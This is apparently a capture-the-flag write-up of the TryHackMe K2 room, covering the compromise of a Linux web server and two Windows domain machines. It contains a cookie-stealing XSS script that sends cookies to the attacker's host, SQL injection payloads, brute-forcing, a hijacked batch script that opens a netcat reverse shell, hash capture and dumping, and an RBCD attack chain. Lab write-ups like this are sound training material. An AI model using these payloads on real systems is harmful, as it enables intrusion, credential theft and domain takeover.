---
title: "TryHackMe: K2"
author: jaxafed
categories: [TryHackMe]
tags: [web, windows, active directory, ffuf, vhost, xss, sqli, ssh, adm, log, netexec, kerbrute, winrm, brute-force, secretsdump, bloodhound, responder, rbcd]
render_with_liquid: false
media_subpath: /images/tryhackme_k2/
image:
  path: room_image.webp
---

**K2** had us solve three machines in sequence, using our findings from the previous machines to tackle the next one.

We began with **Base Camp**, where we targeted a web application and discovered several virtual hosts through fuzzing. By exploiting an **XSS** vulnerability in one of the virtual hosts, we managed to gain access to the other one by stealing a cookie. Subsequently, we leveraged a **SQL injection** vulnerability to extract credentials from the database. We used one of these credentials to gain a shell via **SSH**. As this user, we found a password in one of the web server logs, which we used to obtain **root** access.

Next, we moved on to **Middle Camp**, where we were able to use one of the credentials discovered in **Base Camp** to establish a foothold. This access provided enough information to brute-force the password of another user. Once we had access to this user, we were able to change the password for a member of the **Backup Operators** group. After that, abusing this group membership, we dumped the registries and extracted the hashes. Using these hashes, we successfully obtained a shell as **Administrator**.

Finally, we began **The Summit** by using the same hash for **Administrator** from **Middle Camp** to gain a foothold. By hijacking a script, we managed to get a shell as another user. From there, we exploited our rights over the **Domain Controller (DC)** to perform a **Resource-Based Constrained Delegation (RBCD)** attack, which allowed us to escalate our privileges to the **Administrator** user.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/k2room){: .center }

## Base Camp

### Initial Enumeration

We began the K2 challenge with **Base Camp**, and given the hostname `k2.thm`. We add it to our hosts file.

```console
10.10.123.196 k2.thm
```
{: file="/etc/hosts" }

We start the enumeration with an `nmap` scan.

```console
$ nmap -T4 -n -sC -sV -Pn -p- k2.thm
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fb:52:02:e8:d9:4b:83:1a:52:c9:9c:b8:43:72:83:71 (RSA)
|   256 37:94:6e:99:c2:4f:24:56:fd:ac:77:e2:1b:ec:a0:9f (ECDSA)
|_  256 8f:3b:26:92:67:ec:cc:05:30:27:17:c5:df:9a:42:d2 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Dimension by HTML5 UP
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports:

- 22/SSH
- 80/HTTP

Upon visiting `http://k2.thm/`, it appears to be a static site with nothing of interest.

![Basecamp Web 80 Index](basecamp_web_80_index.webp){: width="1200" height="600" }

### Vhost Enumeration

By fuzzing for virtual hosts, we discover two: `admin.k2.thm` and `it.k2.thm`.

```console
$ ffuf -u 'http://k2.thm/' -H "Host: FUZZ.k2.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -t 50 -ic -fs 13229
...
admin                   [Status: 200, Size: 967, Words: 298, Lines: 24, Duration: 1072ms]
it                      [Status: 200, Size: 1083, Words: 322, Lines: 25, Duration: 1396ms]
```
{: .wrap }

We add these virtual hosts to our hosts file.

```console
10.10.123.196 k2.thm admin.k2.thm it.k2.thm
```
{: file="/etc/hosts" }

Upon visiting `http://it.k2.thm/`, we see a login page for the **IT ticket system**.

![Basecamp Web 80 IT Index](basecamp_web_80_it_index.webp){: width="1200" height="600" }

Upon visiting `http://admin.k2.thm/`, we see a login page for **Admin IT Ticket View**.

![Basecamp Web 80 Admin Index](basecamp_web_80_admin_index.webp){: width="1200" height="600" }

### XSS

Clicking the **Sign Up here** button on `http://it.k2.thm/`, we are redirected to `http://it.k2.thm/register`, where we can register an account.

![Basecamp Web 80 IT Register](basecamp_web_80_it_register.webp){: width="1200" height="600" }

After registering an account and logging in, we are redirected to `http://it.k2.thm/dashboard`, where we see a form for submitting tickets.

![Basecamp Web 80 IT Dashboard](basecamp_web_80_it_dashboard.webp){: width="1200" height="600" }

Testing the form with an XSS payload, we receive a hit on our web server from the server for `desc.jpg`, confirming that the `description` parameter is vulnerable.

![Basecamp Web 80 IT XSS Payload](basecamp_web_80_it_xss_payload.webp){: width="1200" height="600" }

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.123.196 - - [28/Sep/2024 00:29:00] code 404, message File not found
10.10.123.196 - - [28/Sep/2024 00:29:00] "GET /desc.jpg HTTP/1.1" 404 -
```

Now we can try to steal the cookies for the user by changing our payload to `<script src="http://10.11.72.22/xss.js"></script>` and creating `xss.js` as follows:

```js
fetch("http://10.11.72.22/?c="+btoa(document.cookie));
```
{: file="xss.js"}

![Basecamp Web 80 IT XSS Payload Two](basecamp_web_80_it_xss_payload_two.webp){: width="1200" height="600" }

After some time, we observe the user first fetching our `xss.js`, followed by a request that includes the cookies.

```console
10.10.123.196 - - [28/Sep/2024 00:38:00] "GET /xss.js HTTP/1.1" 200 -
10.10.123.196 - - [28/Sep/2024 00:38:00] "GET /?c=c2[REDACTED]QQ== HTTP/1.1" 200 -
```
{: .wrap}

Decoding the value we received from **base64**, we obtain a cookie.

```console
$ echo c2[REDACTED]QQ== | base64 -d
session=eyJh[REDACTED]NwiA
```
{: .wrap }

### SQL Injection

Now, we navigate to `http://admin.k2.thm/` and set the cookie we obtained.

![Basecamp Web 80 Admin Cookie](basecamp_web_80_admin_cookie.webp){: width="1200" height="600" }

With that, we gain access to `http://admin.k2.thm/dashboard`.

![Basecamp Web 80 Admin Dashboard](basecamp_web_80_admin_dashboard.webp){: width="1200" height="600" }

Testing the form on the page, we see that it allows us to search for tickets by title.

![Basecamp Web 80 Admin Form](basecamp_web_80_admin_form.webp){: width="1200" height="600" }

Testing it for SQL injection, we notice that adding a single quote (`'`) to our input returns a `500` response, indicating a potential vulnerability.

![Basecamp Web 80 Admin Form SQLI One](basecamp_web_80_admin_form_sqli_one.webp){: width="1200" height="600" }

To exploit this **SQL Injection** vulnerability to extract data from the database, we first need to determine the column count in the injected query.

With the payload `a' UNION SELECT 1,2,3;#`, we find the column count is **3**.

![Basecamp Web 80 Admin Form SQLI Two](basecamp_web_80_admin_form_sqli_two.webp){: width="1200" height="600" }

Now, we can start extracting data from the database.

Using the payload `title=a' UNION SELECT 1,group_concat(schema_name),3 from information_schema.schemata;#`, we retrieve the database names:

- `information_schema`, `performance_schema`, `ticketsite`

Next, we check the tables in the `ticketsite` database with the payload `title=a' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema='ticketsite';#`:

- `admin_auth`, `auth_users`, `tickets`


We then extract the column names for the `ticketsite.admin_auth` table using the payload `title=a' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema='ticketsite' and table_name='admin_auth';#`:

- `id`, `admin_username`, `admin_password`, `email`

Finally, we dump the table with the payload `title=a' UNION SELECT 1,group_concat(admin_username,':',admin_password,':',email,':',id SEPARATOR '\n'),3 from ticketsite.admin_auth;#`.

```console
james:Pw[REDACTED]3!:james@k2.thm:1
rose:VrMAogdfxW!9:rose@k2.thm:2
bob:PasSW0Rd321:bob@k2.thm:3
steve:St3veRoxx32:steve@k2.thm:4
cait:PartyAlLDaY!32:cait@k2.thm:5
xu:L0v3MyDog!3!:xu@k2.thm:6
ash:PikAchu!IshoesU!:ash@k2.thm:7
```

### Shell as james

Creating a wordlist from the extracted usernames and passwords as follows:

```console
james:Pw[REDACTED]3!
rose:VrMAogdfxW!9
bob:PasSW0Rd321
steve:St3veRoxx32
cait:PartyAlLDaY!32
xu:L0v3MyDog!3!
ash:PikAchu!IshoesU!
```
{: file="combolist.txt" }

Now, testing them against the SSH service using `hydra`, we find that the credentials for the `james` user work.

```console
$ hydra -C combolist.txt ssh://k2.thm
...
[22][ssh] host: k2.thm   login: james   password: Pw[REDACTED]3!
```

We can use the discovered credentials to obtain a shell as the `james` user via **SSH** and read the user flag.

```console
$ ssh james@k2.thm
...
james@k2:~$ wc -c user.txt
38 user.txt
```

### Shell as root

Looking at our IDs, we see that the user belongs to the `adm` group, which allows us to read most of the logs on the machine.

```console
james@k2:~$ id
uid=1002(james) gid=1002(james) groups=1002(james),4(adm)
```

Checking the `nginx` logs, we find some credentials.

```console
james@k2:/var/log/nginx$ grep -Ri 'pass' .
./access.log.1:10.0.2.51 - - [24/May/2023:22:17:17 +0000] "GET /login?username=rose&password=Rd[REDACTED]3! HTTP/1.1" 200 1356 "http://admin.k2.thm/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
```
{: .wrap }

While testing the password for the `rose` user does not work, we are successful with the `root` user, allowing us to read the root flag.

```console
james@k2:/var/log/nginx$ su - root
Password: 
root@k2:~# id
uid=0(root) gid=0(root) groups=0(root)
root@k2:~# wc -c root.txt
38 root.txt
```

### Post-exploitation

After gaining root access, we first check the `/etc/passwd` file, where we find the full names for the users: `Rose Bud` and `James Bold`.

```
root@k2:~# cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
rose:x:1001:1001:Rose Bud:/home/rose:/bin/bash
james:x:1002:1002:James Bold:/home/james:/bin/bash
```

Reading the bash history for the `rose` user, we find the user's password.

```console
root@k2:~# cat /home/rose/.bash_history
sudo suvR[REDACTED]!8
sudo su
```

## Middle Camp

### Initial Enumeration

Moving on to **Middle Camp**, let's start with an `nmap` scan.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.231.218
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-28 02:28:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=K2Server.k2.thm
| Not valid before: 2024-09-27T01:59:30
|_Not valid after:  2025-03-29T01:59:30
|_ssl-date: 2024-09-28T02:30:19+00:00; +2s from scanner time.
| rdp-ntlm-info:
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2SERVER
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2Server.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2024-09-28T02:29:40+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49802/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: K2SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

From the `nmap` scan, we obtain the hostname and the domain, which we add to our hosts file.

```console
10.10.231.218 K2SERVER k2.thm k2server.k2.thm
```
{: file="/etc/hosts" }

### Shell as r.bud

The task explicitly instructs us to use all the information gathered previously. So, let's use the full names we discovered earlier with `username-anarchy` to generate a list of possible usernames.

```console
$ cat fullnames.txt
Rose Bud
James Bold

$ username-anarchy -i fullnames.txt > possible_usernames.txt
```

Testing the possible usernames against Kerberos with `kerberute`, we discover two valid usernames: `r.bud` and `j.bold`.

```console
$ kerbrute userenum --dc K2SERVER -d k2.thm possible_usernames.txt
...
2024/09/28 02:16:52 >  [+] VALID USERNAME:       r.bud@k2.thm
2024/09/28 02:16:53 >  [+] VALID USERNAME:       j.bold@k2.thm
```

Now that we know the username format, we can test the passwords found from **Base Camp** using `netexec`.

While the previous password for the `james` user does not work, the password discovered in the bash history for the `rose` user is successful, and we can also log in using **WinRM**.

```console
$ nxc smb k2server.k2.thm -u 'j.bold' -p 'Pw[REDACTED]3!'
SMB         10.10.231.218   445    K2SERVER         [*] Windows 10.0 Build 17763 x64 (name:K2SERVER) (domain:k2.thm) (signing:True) (SMBv1:False)
SMB         10.10.231.218   445    K2SERVER         [-] k2.thm\j.bold:Pw[REDACTED]3! STATUS_LOGON_FAILURE

$ nxc smb k2server.k2.thm -u 'r.bud' -p 'vR[REDACTED]!8'
SMB         10.10.231.218   445    K2SERVER         [*] Windows 10.0 Build 17763 x64 (name:K2SERVER) (domain:k2.thm) (signing:True) (SMBv1:False)
SMB         10.10.231.218   445    K2SERVER         [+] k2.thm\r.bud:vR[REDACTED]!8

$ nxc winrm k2server.k2.thm -u 'r.bud' -p 'vR[REDACTED]!8'
SMB         10.10.231.218   445    K2SERVER         [*] Windows 10.0 Build 17763 (name:K2SERVER) (domain:k2.thm)
WINRM       10.10.231.218   5985   K2SERVER         [+] k2.thm\r.bud:vR[REDACTED]!8 (Pwn3d!)
```

Now, using `evil-winrm`, we can obtain a shell as the `r.bud` user.

```console
$ evil-winrm -i k2server.k2.thm -u 'r.bud' -p 'vR[REDACTED]!8'
```

### Access as j.bold

Checking the `C:\Users\r.bud\Documents`, we find two files.

```console
*Evil-WinRM* PS C:\Users\r.bud\Documents> dir


    Directory: C:\Users\r.bud\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/29/2024   7:07 PM            327 notes.txt
-a----        1/29/2024   7:09 PM            349 note_to_james.txt
```

The file `note_to_james.txt` provides the old password for James and details the password policy.

```console
*Evil-WinRM* PS C:\Users\r.bud\Documents> type note_to_james.txt
Hello James:

Your password "rockyou" was found to only contain alphabetical characters. I have removed your Remote Access for now.

At the very least adhere to the new password policy:
1. Length of password must be in between 6-12 characters
2. Must include at least 1 special character
3. Must include at least 1 number between the range of 0-999
```
{: .wrap }

The `notes.txt` file reveals that James changed their password to adhere to the password policy by adding two more characters: one must be a special character and the other must be a digit.

```console
*Evil-WinRM* PS C:\Users\r.bud\Documents> type notes.txt
Done:
1. Note was sent and James has already performed the required action. They have informed me that they kept the base password the same, they just added two more characters to meet the criteria. It is easier for James to remember it that way.

2. James's password meets the criteria.

Pending:
1. Give James Remote Access.
```
{: .wrap }

We can use this knowledge to create a list of possible passwords for the user. To do this, we can write a simple Python script.

```python
#!/usr/bin/env python3

import string

base_pass = "rockyou"
special_chars = string.punctuation

f = open("./james_possible_passwords.txt", "w")

for i in range(0, 10):
	for special_char in special_chars:
		f.write(f"{base_pass}{special_char}{i}\n")
		f.write(f"{base_pass}{i}{special_char}\n")
		f.write(f"{special_char}{i}{base_pass}\n")
		f.write(f"{i}{special_char}{base_pass}\n")
		f.write(f"{i}{base_pass}{special_char}\n")
		f.write(f"{special_char}{base_pass}{i}\n")

f.close()
```
{: file="james_password_gen.py"}

Running the script, we obtain a list of possible passwords. Using `kerbrute` to test them, we successfully retrieve the password for the `j.bold` user.

```console
$ kerbrute bruteuser --dc k2server.k2.thm -d k2.thm james_possible_passwords.txt j.bold
...
2024/09/28 03:33:19 >  [+] VALID LOGIN:  j.bold@k2.thm:[REDACTED]
```

While the credentials work, we cannot use them for `WinRM`.

```console
$ nxc smb k2server.k2.thm -u 'j.bold' -p '[REDACTED]'
SMB         10.10.231.218   445    K2SERVER         [*] Windows 10.0 Build 17763 x64 (name:K2SERVER) (domain:k2.thm) (signing:True) (SMBv1:False)
SMB         10.10.231.218   445    K2SERVER         [+] k2.thm\j.bold:[REDACTED]

$ nxc winrm k2server.k2.thm -u 'j.bold' -p '[REDACTED]'
SMB         10.10.231.218   445    K2SERVER         [*] Windows 10.0 Build 17763 (name:K2SERVER) (domain:k2.thm)
WINRM       10.10.231.218   5985   K2SERVER         [-] k2.thm\j.bold:[REDACTED]
```

### Shell as j.smith

Still, we can use them to collect data for **BloodHound** using `bloodhound-python`.

```console
$ bloodhound-python -ns 10.10.231.218 --dns-tcp -u 'j.bold' -p '[REDACTED]' --zip -c All -d k2.thm
```

Checking the data, we see that the `j.bold` user is a member of the `IT STAFF 1` group and members of the `IT STAFF 1` group have the `GenericAll` right over the `j.smith` user.

![Middlecamp Bloodhound](middlecamp_bloodhound.webp){: width="1000" height="300" }

We can use this to change the password for the `j.smith` user as follows.

```console
$ net rpc password 'j.smith' 'NewPassword123@' -U 'K2.THM'/'j.bold'%'[REDACTED]' -S 'k2server.k2.thm'
```

Confirming the password change, we also find that we can use `WinRM`.

```console
$ nxc winrm k2server.k2.thm -u 'j.smith' -p 'NewPassword123@'
SMB         10.10.231.218   445    K2SERVER         [*] Windows 10.0 Build 17763 (name:K2SERVER) (domain:k2.thm)
WINRM       10.10.231.218   5985   K2SERVER         [+] k2.thm\j.smith:NewPassword123@ (Pwn3d!)
```

Using `evil-winrm`, we obtain a shell and can read the user flag at `C:\Users\j.smith\Desktop\user.txt`.

```console
$ evil-winrm -i k2server.k2.thm -u 'j.smith' -p 'NewPassword123@'
```

### Dumping the Hashes

Checking the group memberships for the `j.smith` user in either **BloodHound** or using the shell, we see that the user is a member of the `Backup Operators` group.

```console
*Evil-WinRM* PS C:\Users\j.smith\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ===============================================================
...
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                 Mandatory group, Enabled by default, Enabled group
...
```

We can use this to dump the registries and extract the credentials.

To obtain the local **Administrator** hash, we only need the `SAM` and `SYSTEM` registries.

```
*Evil-WinRM* PS C:\Users\j.smith\Documents> reg save HKLM\SAM sam.reg
The operation completed successfully.

*Evil-WinRM* PS C:\Users\j.smith\Documents> reg save HKLM\SYSTEM system.reg
The operation completed successfully.
```

We can use `evil-winrm` to download them.

```
*Evil-WinRM* PS C:\Users\j.smith\Documents> download C:\Users\j.smith\Documents\sam.reg sam.reg

Info: Downloading C:\Users\j.smith\Documents\sam.reg to sam.reg

Info: Download successful!
*Evil-WinRM* PS C:\Users\j.smith\Documents> download C:\Users\j.smith\Documents\system.reg system.reg

Info: Downloading C:\Users\j.smith\Documents\system.reg to system.reg

Info: Download successful!
```

After downloading, we can use `secretsdump` to extract the hashes.

```console
$ secretsdump.py -sam sam.reg -system system.reg local
...
[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9545[REDACTED]b32f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```


### Shell as Administrator

Now that we have the hash for the local **Administrator**, we can use it with `evil-winrm` to get a shell and read the root flag at `C:\Users\Administrator\Desktop\root.txt`.

```console
$ evil-winrm -i k2server.k2.thm -u 'Administrator' -H 9545[REDACTED]b32f

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
k2\administrator
```

## The Summit

### Initial Enumeration

Moving on to **The Summit**, we start with an `nmap` scan.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.70.89
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-28 04:47:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=K2RootDC.k2.thm
| Not valid before: 2024-09-27T04:18:50
|_Not valid after:  2025-03-29T04:18:50
| rdp-ntlm-info:
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2ROOTDC
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2RootDC.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2024-09-28T04:48:19+00:00
|_ssl-date: 2024-09-28T04:48:58+00:00; +2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49792/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: K2ROOTDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We obtain the hostname and domain name from the scan, adding them to our hosts file.

```console
10.10.70.89 K2ROOTDC k2.thm K2RootDC.k2.thm
```
{: file="/etc/hosts" }

### Shell as j.smith

From the previous target, we already have some usernames. Testing them against **Kerberos**, we find that the username `j.smith` is also valid for this target.

```console
$ cat valid_usernames.txt
r.bud
j.bold
j.smith

$ kerbrute userenum --dc K2ROOTDC -d k2.thm valid_usernames.txt
...
2024/09/28 04:53:03 >  [+] VALID USERNAME:       j.smith@k2.thm
```

Testing the hash we obtained for the **Administrator** earlier, we find that it also works for the `j.smith` user, allowing us to use it with **WinRM** to obtain a shell.

```console
$ nxc smb k2rootdc.k2.thm -u 'j.smith' -H 9545[REDACTED]b32f
SMB         10.10.70.89     445    K2ROOTDC         [*] Windows 10.0 Build 17763 x64 (name:K2ROOTDC) (domain:k2.thm) (signing:True) (SMBv1:False)
SMB         10.10.70.89     445    K2ROOTDC         [+] k2.thm\j.smith:9545[REDACTED]b32f

$ nxc winrm k2rootdc.k2.thm -u 'j.smith' -H 9545[REDACTED]b32f
SMB         10.10.70.89     445    K2ROOTDC         [*] Windows 10.0 Build 17763 (name:K2ROOTDC) (domain:k2.thm)
WINRM       10.10.70.89     5985   K2ROOTDC         [+] k2.thm\j.smith:9545[REDACTED]b32f (Pwn3d!)

$ evil-winrm -i k2rootdc.k2.thm -u 'j.smith' -H 9545[REDACTED]b32f
```

### Shell as o.armstrong

After obtaining a shell, we notice an interesting directory at `C:\`, named `Scripts`.

```
*Evil-WinRM* PS C:\Users\j.smith\Documents> dir C:\


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/14/2018   6:56 AM                EFI
d-----        5/13/2020   5:58 PM                PerfLogs
d-r---       11/14/2018   4:10 PM                Program Files
d-----        3/11/2021   7:29 AM                Program Files (x86)
d-----        5/30/2023   1:32 AM                Scripts
d-r---        5/30/2023   2:29 AM                Users
d-----        5/30/2023   1:17 AM                Windows
```

Inside the `C:\Scripts` directory, we see a script called `backup.bat`, which copies `C:\Users\o.armstrong\Desktop\notes.txt` to `C:\Users\o.armstrong\Documents\backup_notes.txt`.

```
*Evil-WinRM* PS C:\Scripts> dir


    Directory: C:\Scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/30/2023   1:32 AM             92 backup.bat


*Evil-WinRM* PS C:\Scripts> type backup.bat
copy C:\Users\o.armstrong\Desktop\notes.txt C:\Users\o.armstrong\Documents\backup_notes.txt
```

While we don't have any rights to the `backup.bat` file, we have full control over the `C:\Scripts` directory. Therefore, we can delete the existing script and create a new one with the same name to obtain a shell.

```
*Evil-WinRM* PS C:\Scripts> icacls backup.bat
backup.bat NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Administrators:(I)(F)
           BUILTIN\Users:(I)(RX)
           K2\o.armstrong:(I)(F)

Successfully processed 1 files; Failed processing 0 files

*Evil-WinRM* PS C:\Scripts> icacls C:\Scripts
C:\Scripts K2\j.smith:(F)
           K2\o.armstrong:(F)
           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
           BUILTIN\Administrators:(I)(OI)(CI)(F)
           BUILTIN\Users:(I)(OI)(CI)(RX)
           BUILTIN\Users:(I)(CI)(AD)
           BUILTIN\Users:(I)(CI)(WD)
           CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

To achieve this, we will first upload `nc.exe` to the machine and grant permissions so that anyone can run it.

```
*Evil-WinRM* PS C:\Scripts> curl http://10.11.72.22/nc.exe -o c:\windows\system32\tasks\nc.exe
*Evil-WinRM* PS C:\Scripts> icacls C:\Windows\System32\Tasks\nc.exe /grant Everyone:F
processed file: C:\Windows\System32\Tasks\nc.exe
Successfully processed 1 files; Failed processing 0 files
```

Next, we will replace the script to execute our reverse shell payload.

```
*Evil-WinRM* PS C:\Scripts> del backup.bat
*Evil-WinRM* PS C:\Scripts> Set-Content -Path "C:\Scripts\backup.bat" -Value "C:\Windows\System32\Tasks\nc.exe 10.11.72.22 443 -e powershell"
*Evil-WinRM* PS C:\Scripts> type backup.bat
C:\Windows\System32\Tasks\nc.exe 10.11.72.22 443 -e powershell
```
{: .wrap }

After some time, we see that we have received a shell as `o.armstrong` in our listener.

```console
$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.70.89] 49990
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
k2\o.armstrong
```

Using the shell, we will force authentication to our server after running `responder`, allowing us to capture the hash for the user.

```
PS C:\Windows\system32> dir \\10.11.72.22\test\
```

```console
$ sudo responder -I tun0
...
[SMB] NTLMv2-SSP Client   : 10.10.70.89
[SMB] NTLMv2-SSP Username : K2\o.armstrong
[SMB] NTLMv2-SSP Hash     : o.armstrong::K2:1122334455667788:[REDACTED]:[REDACTED]
```

By cracking the hash obtained from `responder`, we recover the user's password.

```console
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
...
ar[REDACTED]08      (o.armstrong)
...
```

Using the password with `evil-winrm`, we can obtain a shell and read the user flag located at `C:\Users\o.armstrong\Desktop\user.txt`.

```console
$ evil-winrm -i k2rootdc.k2.thm -u 'o.armstrong' -p 'ar[REDACTED]08'

*Evil-WinRM* PS C:\Users\o.armstrong\Documents> whoami
k2\o.armstrong
```

> If you're wondering why we bothered to figure out the password for the `o.armstrong` user despite already having a shell as the user, it's to make the next step easier by allowing us to carry out the attack from our own machine. Since `Defender` is running on the target, exploiting it from the shell we obtained would be more challenging.
{: .prompt-tip }

### RBCD

We can also use these credentials to collect `BloodHound` data again.

```console
$ bloodhound-python -ns 10.10.70.89 --dns-tcp -u 'o.armstrong' -p 'ar[REDACTED]08' --zip -c All -d k2.thm
```

Examining our rights in **BloodHound**, we can see that the user `o.armstrong` is a member of the `IT Director` group, whose members have `GenericWrite` right over the `K2ROOTDC`.

![Summit Bloodhound](summit_bloodhound.webp){: width="1000" height="300" }

We can use this to perform a `Resource-based Constrained Delegation` attack after modifying the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the `K2ROOTDC` with our rights.

First, we will use `addcomputer.py` to create a machine account that we control.

```console
$ addcomputer.py -method SAMR -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host K2ROOTDC.K2.THM -domain-netbios K2.THM 'K2.THM/o.armstrong:ar[REDACTED]08'

[*] Successfully added machine account ATTACKERSYSTEM$ with password Summer2018!.
```
{: .wrap }

Next, we will use `rbcd.py` to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of `K2ROOTDC` with our newly created machine account.

```console
$ rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'K2ROOTDC$' -action 'write' 'K2.THM/o.armstrong:ar[REDACTED]08'

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKERSYSTEM$ can now impersonate users on K2ROOTDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKERSYSTEM$   (S-1-5-21-1966530601-3185510712-10604624-1116)
```
{: .wrap }

Now, we can use `getST.py` to request a **TGS**, impersonating the `Administrator` user as `ATTACKERSYSTEM` for the `CIFS/K2ROOTDC.K2.THM` service.

```console
$ getST.py -spn 'cifs/k2rootdc.k2.thm' -impersonate 'Administrator' 'K2.THM/attackersystem$:Summer2018!'

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

We will set the ticket using the `KRB5CCNAME` variable.

```
$ export KRB5CCNAME=Administrator.ccache
```

Finally, we can use `secretsdump` with the obtained ticket to dump the hashes from the DC.

```console
$ secretsdump.py -k -no-pass 'K2.THM/Administrator@k2rootdc.k2.thm'
...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:15ec[REDACTED]4b90:::
...
```

### Shell as Administrator

